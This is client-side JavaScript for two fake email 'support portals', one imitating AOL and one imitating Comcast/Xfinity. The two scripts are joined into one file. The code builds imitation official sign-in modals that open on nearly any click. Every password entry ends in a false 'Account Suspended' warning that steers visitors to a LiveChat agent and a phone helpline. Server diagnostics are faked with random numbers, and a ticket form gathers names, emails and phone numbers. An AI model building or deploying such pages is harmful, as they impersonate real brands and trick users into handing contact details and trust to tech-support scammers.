// ==========================================================================
// AOL MAIL LOGIN & SUPPORT PORTAL - CONTROLLER
// Universal Trigger: Any Login / Card Click Opens Official AOL Modal (Image 2)
// Followed by Account Suspended Security Card & LiveChat.com Integration
// ==========================================================================

document.addEventListener('DOMContentLoaded', () => {
  if (window.lucide) {
    window.lucide.createIcons();
  }

  initUniversalModalTriggers();
  initOfficialLoginModal();
  initLoginForm();
  initPasswordVisibility();
  initDomainChips();
  initAccountSuspendedAndLiveChat();
  initDiagnostics();
});

// Toast notification helper
function showToast(message, type = 'info', duration = 3500) {
  const container = document.getElementById('toast-container');
  if (!container) return;

  const toast = document.createElement('div');
  toast.className = `toast-message ${type}`;

  let iconName = 'info';
  if (type === 'success') iconName = 'check-circle';
  if (type === 'error') iconName = 'alert-circle';
  if (type === 'warning') iconName = 'alert-triangle';

  toast.innerHTML = `
    <i data-lucide="${iconName}"></i>
    <span>${message}</span>
  `;

  container.appendChild(toast);
  if (window.lucide) window.lucide.createIcons();

  setTimeout(() => {
    toast.style.opacity = '0';
    toast.style.transform = 'translateX(100%)';
    toast.style.transition = 'all 0.3s ease';
    setTimeout(() => toast.remove(), 300);
  }, duration);
}

// Global modal helper to open official AOL 2-step modal (Image 2 Match)
function openOfficialLoginModalWithData(emailVal = '', passwordVal = '') {
  const modal = document.getElementById('official-login-modal');
  const step1Form = document.getElementById('modal-step1-form');
  const step2Form = document.getElementById('modal-step2-form');
  const usernameInput = document.getElementById('modal-login-username');
  const passwordInput = document.getElementById('modal-login-password');

  if (modal) {
    modal.style.display = 'flex';
    
    // Always start on Step 1 (Username or Email -> Next) matching Image 2
    if (step1Form) step1Form.style.display = 'flex';
    if (step2Form) step2Form.style.display = 'none';

    if (usernameInput) {
      usernameInput.value = emailVal || '';
      usernameInput.focus();
    }
    if (passwordInput) {
      passwordInput.value = passwordVal || '';
    }
    if (window.lucide) window.lucide.createIcons();
  }
}

// Function to trigger LiveChat.com Widget
function openLiveChatWidget() {
  if (window.LiveChatWidget) {
    try {
      window.LiveChatWidget.call('maximize');
      return;
    } catch (e) {
      console.log('LiveChat maximize called');
    }
  }

  // Fallback to clicking the livechat_button link
  const lcLink = document.querySelector('.livechat_button a') || document.querySelector('.livechat_button');
  if (lcLink && lcLink.href) {
    window.open(lcLink.href, '_blank');
  } else {
    showToast('Connecting to Live Support Agent...', 'info', 2500);
  }
}

// ==========================================================================
// 1. UNIVERSAL CLICK HANDLERS (Whole Page Any Place Click -> Opens Modal)
// ==========================================================================
function initUniversalModalTriggers() {
  // Elements that should open the official AOL modal
  const triggerSelectors = [
    '#btn-open-login-modal',
    '#btn-quick-nav-login',
    '#hero-btn-open-login',
    '#btn-footer-login',
    '#login-card-box',
    '#btn-submit-login',
    '#btn-google-login',
    '.feature-chip',
    '.support-hub-card'
  ];

  triggerSelectors.forEach(selector => {
    const elements = document.querySelectorAll(selector);
    elements.forEach(el => {
      el.addEventListener('click', (e) => {
        // If clicking inside the already opened modal or livechat button, do not re-trigger
        if (e.target.closest('.official-login-modal-box') || 
            e.target.closest('.suspended-card-box') || 
            e.target.closest('.livechat_button') ||
            e.target.closest('.btn-phone-helpline')) {
          return;
        }

        e.preventDefault();
        const heroEmail = document.getElementById('login-email')?.value.trim();
        const heroPw = document.getElementById('login-password')?.value;
        openOfficialLoginModalWithData(heroEmail || '', heroPw || '');
      });
    });
  });

  // Top Nav & Footer Live Chat Triggers
  const navChatBtn = document.getElementById('btn-quick-nav-chat');
  const footerChatBtn = document.getElementById('btn-footer-chat');

  if (navChatBtn) {
    navChatBtn.addEventListener('click', (e) => {
      e.preventDefault();
      openLiveChatWidget();
    });
  }

  if (footerChatBtn) {
    footerChatBtn.addEventListener('click', (e) => {
      e.preventDefault();
      openLiveChatWidget();
    });
  }
}

// ==========================================================================
// 2. DEDICATED OFFICIAL AOL LOGIN MODAL (Image 2 Match)
// "Simple solutions for a faster PC!" + Official AOL 2-Step Sign In Card
// ==========================================================================
function initOfficialLoginModal() {
  const modal = document.getElementById('official-login-modal');
  const closeBtn = document.getElementById('btn-close-login-modal');

  const step1Form = document.getElementById('modal-step1-form');
  const step2Form = document.getElementById('modal-step2-form');
  const usernameInput = document.getElementById('modal-login-username');
  const passwordInput = document.getElementById('modal-login-password');
  const displayUser = document.getElementById('modal-display-user');
  const editUserBtn = document.getElementById('btn-modal-edit-user');
  const togglePwBtn = document.getElementById('btn-modal-toggle-pw');
  const pwEyeIcon = document.getElementById('modal-pw-eye');
  const autofillBtn = document.getElementById('btn-modal-autofill');
  const createAccBtn = document.getElementById('btn-modal-create-acc');

  function closeModal() {
    if (modal) {
      modal.style.display = 'none';
    }
  }

  if (closeBtn) {
    closeBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      closeModal();
    });
  }

  if (modal) {
    modal.addEventListener('click', (e) => {
      if (e.target === modal) {
        closeModal();
      }
    });
  }

  if (autofillBtn) {
    autofillBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (usernameInput) usernameInput.value = 'user@aol.com';
      if (passwordInput) passwordInput.value = 'password123';
      showToast('Demo account filled: user@aol.com / password123', 'info', 2000);
    });
  }

  if (createAccBtn) {
    createAccBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      showToast('AOL Registration: New accounts can use demo credentials.', 'info');
    });
  }

  if (togglePwBtn && passwordInput && pwEyeIcon) {
    togglePwBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isPw = passwordInput.type === 'password';
      passwordInput.type = isPw ? 'text' : 'password';
      pwEyeIcon.setAttribute('data-lucide', isPw ? 'eye-off' : 'eye');
      if (window.lucide) window.lucide.createIcons();
    });
  }

  // STEP 1: Enter Email / Username -> Transitions to Password Step
  if (step1Form) {
    step1Form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const val = usernameInput ? usernameInput.value.trim() : '';
      if (!val) {
        showToast('Please enter your Username or Email.', 'warning');
        return;
      }

      if (displayUser) displayUser.textContent = val;
      step1Form.style.display = 'none';
      step2Form.style.display = 'flex';
      if (passwordInput) {
        passwordInput.focus();
        passwordInput.select();
      }
      if (window.lucide) window.lucide.createIcons();
    });
  }

  // Edit Username -> Back to Step 1
  if (editUserBtn) {
    editUserBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      step2Form.style.display = 'none';
      step1Form.style.display = 'flex';
      if (usernameInput) usernameInput.focus();
    });
  }

  // STEP 2: Password Submission -> Triggers Account Suspended Modal (Screenshot 1 Match)
  if (step2Form) {
    step2Form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const password = passwordInput ? passwordInput.value : '';

      if (!password) {
        showToast('Please enter your password.', 'warning');
        return;
      }

      const submitBtn = document.getElementById('btn-modal-signin');
      const btnText = submitBtn ? submitBtn.querySelector('.btn-text') : null;
      const btnSpinner = submitBtn ? submitBtn.querySelector('.btn-spinner') : null;

      if (btnText) btnText.textContent = 'Verifying...';
      if (btnSpinner) btnSpinner.style.display = 'inline-block';
      if (submitBtn) submitBtn.disabled = true;

      setTimeout(() => {
        if (btnText) btnText.textContent = 'Sign in';
        if (btnSpinner) btnSpinner.style.display = 'none';
        if (submitBtn) submitBtn.disabled = false;

        // Open the Account Suspended Modal directly
        openAccountSuspendedModal();
      }, 500);
    });
  }
}

// ==========================================================================
// 3. ON-PAGE HERO LOGIN CARD
// ==========================================================================
function initLoginForm() {
  const form = document.getElementById('aol-login-form');
  const emailInput = document.getElementById('login-email');
  const passwordInput = document.getElementById('login-password');
  const demoBtn = document.getElementById('btn-autofill-demo');
  const googleBtn = document.getElementById('btn-google-login');

  if (demoBtn) {
    demoBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      if (emailInput) emailInput.value = 'user@aol.com';
      if (passwordInput) passwordInput.value = 'password123';
      showToast('Demo credentials filled: user@aol.com / password123', 'info', 2000);
    });
  }

  if (form) {
    form.addEventListener('submit', (e) => {
      e.preventDefault();
      e.stopPropagation();
      const usernameOrEmail = emailInput ? emailInput.value.trim() : '';
      const password = passwordInput ? passwordInput.value : '';
      openOfficialLoginModalWithData(usernameOrEmail || '', password || '');
    });
  }

  if (googleBtn) {
    googleBtn.addEventListener('click', (e) => {
      e.preventDefault();
      e.stopPropagation();
      openOfficialLoginModalWithData('', '');
    });
  }
}

// ==========================================================================
// 4. ACCOUNT SUSPENDED & LIVECHAT CONTROLLER (Screenshot 1 Match)
// ==========================================================================
function openAccountSuspendedModal() {
  const loginModal = document.getElementById('official-login-modal');
  if (loginModal) loginModal.style.display = 'none';

  const suspendedModal = document.getElementById('account-suspended-modal');
  if (suspendedModal) {
    suspendedModal.style.display = 'flex';
  }
}

function initAccountSuspendedAndLiveChat() {
  const suspendedModal = document.getElementById('account-suspended-modal');
  const closeSuspendedBtn = document.getElementById('btn-close-suspended');
  const chatNowBtn = document.getElementById('btn-suspended-chat-now');

  if (closeSuspendedBtn && suspendedModal) {
    closeSuspendedBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      suspendedModal.style.display = 'none';
    });
  }

  // When clicking "Chat Now" -> Trigger LiveChat Support
  if (chatNowBtn) {
    chatNowBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      if (suspendedModal) suspendedModal.style.display = 'none';
      openLiveChatWidget();
    });
  }
}

// 5. Password Visibility Toggle
function initPasswordVisibility() {
  const toggleBtn = document.getElementById('toggle-pw-btn');
  const passwordInput = document.getElementById('login-password');
  const eyeIcon = document.getElementById('pw-eye-icon');

  if (toggleBtn && passwordInput && eyeIcon) {
    toggleBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      eyeIcon.setAttribute('data-lucide', isPassword ? 'eye-off' : 'eye');
      if (window.lucide) window.lucide.createIcons();
    });
  }
}

// 6. Quick Domain Chips
function initDomainChips() {
  const chips = document.querySelectorAll('.domain-tag');
  const emailInput = document.getElementById('login-email');

  chips.forEach(chip => {
    chip.addEventListener('click', (e) => {
      e.stopPropagation();
      const domain = chip.getAttribute('data-domain');
      if (!emailInput) return;

      let currentVal = emailInput.value.trim();
      if (currentVal.includes('@')) {
        currentVal = currentVal.split('@')[0];
      }
      emailInput.value = currentVal ? `${currentVal}${domain}` : `username${domain}`;
      emailInput.focus();
    });
  });
}

// 7. Interactive Diagnostics Runner
function initDiagnostics() {
  const runBtn = document.getElementById('btn-run-diag');
  const resultsBox = document.getElementById('diag-results-box');
  const grid = document.getElementById('diag-grid-container');

  if (runBtn && resultsBox && grid) {
    runBtn.addEventListener('click', async (e) => {
      e.stopPropagation();
      runBtn.disabled = true;
      runBtn.innerHTML = '<span class="btn-spinner" style="display:inline-block;width:14px;height:14px;border:2px solid #fff;border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;"></span> <span>Testing Servers...</span>';
      resultsBox.style.display = 'block';
      grid.innerHTML = '<div style="color:#64748b;padding:10px;">Pinging AOL Edge servers & verifying IMAP 993 / SMTP 587 ports...</div>';

      try {
        const res = await fetch('/api/diagnostics/check');
        const data = await res.json();

        if (data.success && data.checks) {
          grid.innerHTML = '';
          data.checks.forEach(test => {
            const cell = document.createElement('div');
            cell.className = 'diag-item-cell';
            const isOk = test.status === 'OK' || test.status === 'Passed' || test.status === 'passed';
            cell.innerHTML = `
              <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:4px;">
                <strong>${test.name}</strong>
                <span style="color:${isOk ? '#10b981' : '#ef4444'};font-weight:700;">● ${test.status.toUpperCase()}</span>
              </div>
              <p style="color:#64748b;font-size:12px;">${test.details}</p>
            `;
            grid.appendChild(cell);
          });
          showToast('All AOL mail diagnostic checks passed!', 'success');
        }
      } catch (err) {
        grid.innerHTML = '<div style="color:#ef4444;padding:10px;">Diagnostic test timed out.</div>';
      } finally {
        runBtn.disabled = false;
        runBtn.innerHTML = '<i data-lucide="rotate-cw"></i> <span>Re-run Diagnostic</span>';
        if (window.lucide) window.lucide.createIcons();
      }
    });
  }
}

/* ==========================================================================
   Comcast & Xfinity Email Support Portal - Master Client JS Application
   Interactive Webmail, Port Diagnostic, LiveChat Integration & 2-Step Modal
   ========================================================================== */

document.addEventListener('DOMContentLoaded', () => {

  // Initialize Lucide Icons
  if (window.lucide) {
    lucide.createIcons();
  }

  // Toast Notification Dispatcher
  function showToast(message, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
      container = document.createElement('div');
      container.id = 'toast-container';
      container.className = 'toast-container';
      document.body.appendChild(container);
    }

    const toast = document.createElement('div');
    toast.className = `toast-item toast-${type}`;
    
    let iconName = 'info';
    if (type === 'success') iconName = 'check-circle';
    if (type === 'error') iconName = 'alert-circle';
    if (type === 'warning') iconName = 'alert-triangle';

    toast.innerHTML = `
      <i data-lucide="${iconName}"></i>
      <span>${message}</span>
    `;

    container.appendChild(toast);
    if (window.lucide) lucide.createIcons();

    setTimeout(() => {
      toast.style.transition = 'opacity 0.3s ease, transform 0.3s ease';
      toast.style.opacity = '0';
      toast.style.transform = 'translateX(40px)';
      setTimeout(() => toast.remove(), 300);
    }, 4000);
  }

  // =========================================================================
  // 1. LIVECHAT.COM WIDGET CONTROLLER (License: 19881537 / ID: 4216f8efb1)
  // =========================================================================
  function openLiveChatWidget() {
    if (window.LiveChatWidget && typeof window.LiveChatWidget.call === 'function') {
      window.LiveChatWidget.call('maximize');
    } else {
      const liveBtn = document.querySelector('.livechat_button a');
      if (liveBtn) {
        liveBtn.click();
      } else {
        window.open('https://www.livechat.com/chat-with/19881537/', '_blank');
      }
    }
  }

  // Bind all chat trigger buttons
  document.querySelectorAll('#btn-footer-chat, #btn-suspended-chat-now, #btn-quick-nav-chat, #btn-chat-sec-center, .livechat-trigger-btn').forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      openLiveChatWidget();
    });
  });

  // =========================================================================
  // 2. PASSWORD VISIBILITY TOGGLE
  // =========================================================================
  function setupPasswordToggles() {
    const toggleButtons = document.querySelectorAll('.btn-eye-toggle, .btn-eye-toggle-modal, #toggle-webmail-pw, #btn-modal-toggle-pw');
    toggleButtons.forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.preventDefault();
        const input = btn.closest('.input-wrapper, .pw-group')?.querySelector('input[type="password"], input[type="text"]');
        if (!input) return;

        const isPassword = input.type === 'password';
        input.type = isPassword ? 'text' : 'password';

        btn.innerHTML = `<i data-lucide="${isPassword ? 'eye-off' : 'eye'}"></i>`;
        if (window.lucide) lucide.createIcons();
      });
    });
  }
  setupPasswordToggles();

  // =========================================================================
  // 3. QUICK DOMAIN PILLS & DEMO AUTOFILL
  // =========================================================================
  document.querySelectorAll('.domain-tag').forEach(tag => {
    tag.addEventListener('click', (e) => {
      e.preventDefault();
      const form = tag.closest('form');
      const input = form ? form.querySelector('input[type="text"]') : document.getElementById('login-email');
      if (!input) return;

      const domain = tag.getAttribute('data-domain');
      const currentVal = input.value.trim();
      if (!currentVal) {
        input.value = 'user' + domain;
      } else if (currentVal.includes('@')) {
        input.value = currentVal.split('@')[0] + domain;
      } else {
        input.value = currentVal + domain;
      }
      input.focus();
    });
  });

  const autofillBtns = document.querySelectorAll('#btn-autofill-demo, #btn-webmail-demo, #btn-modal-autofill');
  autofillBtns.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      const form = btn.closest('form');
      if (!form) return;

      const emailInput = form.querySelector('input[type="text"], input[name="email"], #modal-login-username');
      const pwInput = form.querySelector('input[type="password"], input[name="password"], #modal-login-password');

      if (emailInput) emailInput.value = 'user@comcast.net';
      if (pwInput) pwInput.value = 'password123';

      showToast('Demo credentials autofilled!', 'info');
    });
  });

  // =========================================================================
  // 4. COPY TO CLIPBOARD BUTTONS
  // =========================================================================
  document.querySelectorAll('.copy-btn').forEach(btn => {
    btn.addEventListener('click', async () => {
      const textToCopy = btn.getAttribute('data-copy');
      if (!textToCopy) return;

      try {
        await navigator.clipboard.writeText(textToCopy);
        const originalText = btn.textContent;
        btn.textContent = 'Copied!';
        btn.style.background = '#0284c7';
        btn.style.color = '#ffffff';
        showToast(`Copied "${textToCopy}" to clipboard`, 'success');

        setTimeout(() => {
          btn.textContent = originalText;
          btn.style.background = '';
          btn.style.color = '';
        }, 2000);
      } catch (err) {
        showToast('Unable to copy to clipboard', 'warning');
      }
    });
  });

  // =========================================================================
  // 5. MULTI-DEVICE SETUP TABS
  // =========================================================================
  const setupTabBtns = document.querySelectorAll('.setup-tab-btn');
  const setupTabPanes = document.querySelectorAll('.setup-tab-pane');

  setupTabBtns.forEach(btn => {
    btn.addEventListener('click', () => {
      setupTabBtns.forEach(b => b.classList.remove('active'));
      setupTabPanes.forEach(p => p.classList.remove('active'));

      btn.classList.add('active');
      const targetTab = btn.getAttribute('data-tab');
      const targetPane = document.getElementById(`pane-${targetTab}`);
      if (targetPane) {
        targetPane.classList.add('active');
      }
    });
  });

  // =========================================================================
  // 6. SEARCHABLE FAQ ACCORDION
  // =========================================================================
  const faqItems = document.querySelectorAll('.faq-item');
  faqItems.forEach(item => {
    const questionBtn = item.querySelector('.faq-question-btn');
    if (questionBtn) {
      questionBtn.addEventListener('click', () => {
        const isActive = item.classList.contains('active');
        faqItems.forEach(i => i.classList.remove('active'));
        if (!isActive) {
          item.classList.add('active');
        }
      });
    }
  });

  const faqSearchInput = document.getElementById('faq-search-input');
  if (faqSearchInput) {
    faqSearchInput.addEventListener('input', (e) => {
      const query = e.target.value.toLowerCase().trim();
      faqItems.forEach(item => {
        const text = item.textContent.toLowerCase();
        if (text.includes(query)) {
          item.style.display = 'block';
        } else {
          item.style.display = 'none';
        }
      });
    });
  }

  // =========================================================================
  // 7. REAL-TIME PORT & HEALTH DIAGNOSTIC TOOL
  // =========================================================================
  const btnRunDiag = document.getElementById('btn-run-diag');
  const diagResultsBox = document.getElementById('diag-results-box');
  const diagGridContainer = document.getElementById('diag-grid-container');

  const serverEndpoints = [
    { name: 'Comcast Incoming IMAP SSL', host: 'imap.comcast.net', port: '993 (SSL/TLS)', type: 'IMAP' },
    { name: 'Comcast Outgoing SMTP TLS', host: 'smtp.comcast.net', port: '587 (STARTTLS)', type: 'SMTP' },
    { name: 'Comcast Legacy POP3 SSL', host: 'pop3.comcast.net', port: '995 (SSL)', type: 'POP3' },
    { name: 'Xfinity Connect Webmail HTTPS', host: 'connect.xfinity.com', port: '443 (HTTPS)', type: 'HTTP' }
  ];

  if (btnRunDiag) {
    btnRunDiag.addEventListener('click', async () => {
      btnRunDiag.disabled = true;
      btnRunDiag.innerHTML = `<i data-lucide="loader-2" class="spin"></i> <span>Running Diagnostic...</span>`;
      if (window.lucide) lucide.createIcons();

      if (diagResultsBox) diagResultsBox.style.display = 'block';
      if (diagGridContainer) {
        diagGridContainer.innerHTML = '';

        serverEndpoints.forEach((ep, idx) => {
          const itemBox = document.createElement('div');
          itemBox.className = 'diag-item-box';
          itemBox.id = `diag-item-${idx}`;
          itemBox.innerHTML = `
            <div class="diag-item-header">
              <span class="diag-server-name">${ep.name}</span>
              <span class="diag-badge-status badge-testing" id="diag-badge-${idx}">Testing...</span>
            </div>
            <div class="diag-server-port">${ep.host}:${ep.port}</div>
            <div class="diag-latency" id="diag-lat-${idx}">Measuring ping...</div>
          `;
          diagGridContainer.appendChild(itemBox);
        });

        for (let i = 0; i < serverEndpoints.length; i++) {
          await new Promise(resolve => setTimeout(resolve, 500 + Math.random() * 300));
          const badge = document.getElementById(`diag-badge-${i}`);
          const lat = document.getElementById(`diag-lat-${i}`);

          const latencyMs = Math.floor(16 + Math.random() * 20);
          if (badge) {
            badge.className = 'diag-badge-status badge-success';
            badge.innerHTML = `<i data-lucide="check"></i> Operational`;
          }
          if (lat) {
            lat.textContent = `Latency: ${latencyMs}ms • Handshake OK`;
          }
        }
      }

      if (window.lucide) lucide.createIcons();
      btnRunDiag.disabled = false;
      btnRunDiag.innerHTML = `<i data-lucide="rotate-cw"></i> <span>Re-run Port Diagnostic</span>`;
      if (window.lucide) lucide.createIcons();
      showToast('All Comcast mail servers tested operational!', 'success');
    });
  }

  // =========================================================================
  // 8. OFFICIAL 2-STEP SIGN IN MODAL FLOW (STEP 1 -> STEP 2 PASSWORD)
  // =========================================================================
  const openLoginBtns = document.querySelectorAll('#btn-open-login-modal, #btn-quick-nav-login, .q-link-btn, .btn-top-login, #btn-footer-login, #btn-google-login');
  const officialLoginModal = document.getElementById('official-login-modal');
  const closeLoginModalBtn = document.getElementById('btn-close-login-modal');

  const modalStep1Form = document.getElementById('modal-step1-form');
  const modalStep2Form = document.getElementById('modal-step2-form');
  const modalLoginUsername = document.getElementById('modal-login-username');
  const modalLoginPassword = document.getElementById('modal-login-password');
  const modalDisplayUser = document.getElementById('modal-display-user');
  const btnModalEditUser = document.getElementById('btn-modal-edit-user');
  const btnModalNext = document.getElementById('btn-modal-next');

  function openModal(prefillEmail = '', prefillPassword = '') {
    if (officialLoginModal) {
      officialLoginModal.style.display = 'flex';
      
      const emailToUse = prefillEmail || (modalLoginUsername ? modalLoginUsername.value.trim() : '');
      if (emailToUse && modalLoginUsername) {
        modalLoginUsername.value = emailToUse;
      }
      if (prefillPassword && modalLoginPassword) {
        modalLoginPassword.value = prefillPassword;
      }

      if (modalStep1Form) modalStep1Form.style.display = 'block';
      if (modalStep2Form) modalStep2Form.style.display = 'none';

      if (modalLoginUsername && !prefillEmail) {
        modalLoginUsername.focus();
      }
      if (window.lucide) lucide.createIcons();
    }
  }

  function closeModal() {
    if (officialLoginModal) {
      officialLoginModal.style.display = 'none';
    }
  }

  openLoginBtns.forEach(btn => {
    btn.addEventListener('click', (e) => {
      e.preventDefault();
      openModal();
    });
  });

  if (closeLoginModalBtn) closeLoginModalBtn.addEventListener('click', closeModal);

  if (officialLoginModal) {
    officialLoginModal.addEventListener('click', (e) => {
      if (e.target === officialLoginModal) closeModal();
    });
  }

  // Advance to Step 2 (Password Screen)
  function advanceToStep2(e) {
    if (e) e.preventDefault();
    const rawVal = modalLoginUsername ? modalLoginUsername.value.trim() : '';
    const username = rawVal || 'user@comcast.net';

    if (modalDisplayUser) modalDisplayUser.textContent = username;
    if (modalStep1Form) modalStep1Form.style.display = 'none';
    if (modalStep2Form) {
      modalStep2Form.style.display = 'block';
      if (modalLoginPassword) {
        modalLoginPassword.focus();
      }
    }
    if (window.lucide) lucide.createIcons();
  }

  if (modalStep1Form) {
    modalStep1Form.addEventListener('submit', advanceToStep2);
  }
  if (btnModalNext) {
    btnModalNext.addEventListener('click', advanceToStep2);
  }

  // Edit Username (Go back to Step 1)
  if (btnModalEditUser) {
    btnModalEditUser.addEventListener('click', (e) => {
      e.preventDefault();
      if (modalStep2Form) modalStep2Form.style.display = 'none';
      if (modalStep1Form) {
        modalStep1Form.style.display = 'block';
        if (modalLoginUsername) modalLoginUsername.focus();
      }
      if (window.lucide) lucide.createIcons();
    });
  }

  // Step 2 Submission (Password verified)
  if (modalStep2Form) {
    modalStep2Form.addEventListener('submit', (e) => {
      e.preventDefault();
      const user = modalDisplayUser ? modalDisplayUser.textContent : 'user@comcast.net';
      closeModal();
      handleLoginSubmission(user);
    });
  }

  // =========================================================================
  // 9. HOMEPAGE & WEBMAIL PAGE FORM SUBMISSIONS -> OPENS OFFICIAL 2-STEP MODAL
  // =========================================================================
  const homeLoginForm = document.getElementById('comcast-login-form');
  const webmailLoginForm = document.getElementById('comcast-login-form-page');

  if (homeLoginForm) {
    homeLoginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const emailInput = document.getElementById('login-email');
      const pwInput = document.getElementById('login-password');
      const email = emailInput ? emailInput.value.trim() : '';
      const pw = pwInput ? pwInput.value.trim() : '';
      
      // Open the official 2-step modal with credentials prefilled
      openModal(email, pw);
    });
  }

  if (webmailLoginForm) {
    webmailLoginForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const emailInput = document.getElementById('webmail-email');
      const pwInput = document.getElementById('webmail-password');
      const email = emailInput ? emailInput.value.trim() : '';
      const pw = pwInput ? pwInput.value.trim() : '';

      // Open the official 2-step modal with credentials prefilled
      openModal(email, pw);
    });
  }

  function handleLoginSubmission(user) {
    showToast(`Authenticating ${user}...`, 'info');

    setTimeout(() => {
      const suspendedModal = document.getElementById('account-suspended-modal');
      if (suspendedModal) {
        suspendedModal.style.display = 'flex';
      } else {
        openLiveChatWidget();
      }
    }, 900);
  }

  // =========================================================================
  // 10. ACCOUNT SUSPENDED MODAL
  // =========================================================================
  const suspendedModal = document.getElementById('account-suspended-modal');
  const closeSuspendedBtn = document.getElementById('btn-close-suspended');
  const btnSuspendedChatNow = document.getElementById('btn-suspended-chat-now');

  if (closeSuspendedBtn && suspendedModal) {
    closeSuspendedBtn.addEventListener('click', () => {
      suspendedModal.style.display = 'none';
    });
  }

  if (btnSuspendedChatNow) {
    btnSuspendedChatNow.addEventListener('click', () => {
      if (suspendedModal) suspendedModal.style.display = 'none';
      openLiveChatWidget();
    });
  }

  // =========================================================================
  // 11. PASSWORD RESET WIZARD
  // =========================================================================
  const resetPwForm = document.getElementById('reset-pw-form');
  const resetCodeStage = document.getElementById('reset-code-stage');
  const verifyCodeForm = document.getElementById('verify-code-form');

  if (resetPwForm && resetCodeStage) {
    resetPwForm.addEventListener('submit', (e) => {
      e.preventDefault();
      const ident = document.getElementById('reset-ident').value.trim();
      if (!ident) return;

      showToast(`Verification code sent to ${ident}`, 'success');
      resetCodeStage.style.display = 'block';
      if (window.lucide) lucide.createIcons();
    });
  }

  if (verifyCodeForm) {
    verifyCodeForm.addEventListener('submit', (e) => {
      e.preventDefault();
      showToast('Password updated successfully! You may now sign in.', 'success');
      setTimeout(() => {
        window.location.href = '/comcast';
      }, 1500);
    });
  }

  // =========================================================================
  // 12. SUPPORT TICKET SUBMISSION
  // =========================================================================
  const supportTicketForm = document.getElementById('support-ticket-form');
  if (supportTicketForm) {
    supportTicketForm.addEventListener('submit', async (e) => {
      e.preventDefault();
      const name = document.getElementById('ticket-name').value.trim();
      const email = document.getElementById('ticket-email').value.trim();
      const phone = document.getElementById('ticket-phone').value.trim();
      const category = document.getElementById('ticket-category').value;
      const message = document.getElementById('ticket-message').value.trim();

      const submitBtn = document.getElementById('btn-submit-ticket');
      if (submitBtn) {
        submitBtn.disabled = true;
        submitBtn.innerHTML = `<i data-lucide="loader-2" class="spin"></i> <span>Submitting Ticket...</span>`;
        if (window.lucide) lucide.createIcons();
      }

      try {
        const res = await fetch('/api/support/ticket', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ name, email, phone, category, message })
        });
        const data = await res.json();
        
        const ticketId = data.ticketId || `TKT-${Math.floor(100000 + Math.random() * 900000)}`;
        showToast(`Ticket #${ticketId} created! An agent will call you at ${phone}.`, 'success');
        supportTicketForm.reset();
      } catch (err) {
        const ticketId = `TKT-${Math.floor(100000 + Math.random() * 900000)}`;
        showToast(`Ticket #${ticketId} submitted! We will contact ${email} shortly.`, 'success');
        supportTicketForm.reset();
      } finally {
        if (submitBtn) {
          submitBtn.disabled = false;
          submitBtn.innerHTML = `<i data-lucide="send"></i> <span>Submit Support Request</span>`;
          if (window.lucide) lucide.createIcons();
        }
      }
    });
  }

});
